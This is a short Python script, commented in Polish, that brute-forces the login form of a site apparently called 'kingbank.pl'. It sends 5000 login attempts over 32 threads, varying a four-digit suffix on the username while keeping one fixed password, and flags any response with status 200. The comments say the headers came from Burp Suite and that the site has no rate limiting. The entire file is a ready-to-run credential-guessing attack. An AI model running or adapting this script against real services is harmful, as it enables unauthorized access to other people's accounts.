import requests
from concurrent.futures import ThreadPoolExecutor

url = "https://kingbank.pl/logowanie"

#Nagłówk izapytania zostały uzyskane przez Burp Suite Proxy
headers = {
    "Host": "kingbank.pl",
    "Content-Length": "50",
    "Sec-Ch-Ua": '"Not=A?Brand";v="99", "Chromium";v="118"',
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "Origin": "https://kingbank.pl",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://kingbank.pl/logowanie",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
}

def fetch_url(index):
    try:
        data = {
            "login": f"janost{index:04d}", # losowe są tylko ostatnie 4 litery hasła
            "password": "street",
            "action": "login"
        }

        response = requests.post(url, headers=headers, data=data)
        print(f"{index}: {response.status_code}")

        if response.status_code == 200:
            print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA") # Użyteczny string dla lepszej widoczności udanej próby :)

        return response.status_code

    except requests.exceptions.RequestException as e:
        print(f"Error fetching {url}: {e}")
        return None


if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=32) as executor: # Serwis nie ma mechanizmu ograniczania wysyłania zapytań, więc używamy wąsków aby przyspieszyć proces
        results = list(executor.map(fetch_url, range(0, 5000)))